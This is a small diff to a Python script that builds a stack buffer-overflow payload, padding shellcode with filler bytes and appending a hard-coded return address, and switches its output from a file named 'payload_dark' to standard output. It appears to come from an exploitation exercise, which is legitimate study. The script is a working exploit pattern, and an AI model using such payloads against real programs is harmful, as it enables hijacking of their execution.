@@ -1,3 +1,4 @@
+import sys
 import struct
 
 stack_addr = 0x721000800fd0
@@ -8,7 +9,4 @@ payload = shellcode.ljust(16, b'A')
 payload += b'B' * 8
 payload += struct.pack('<Q', stack_addr)
 
-with open('payload_dark', 'wb') as f:
-    f.write(payload)
-
-print("[*] 终极避坑 Payload 生成成功！")
+sys.stdout.buffer.write(payload)
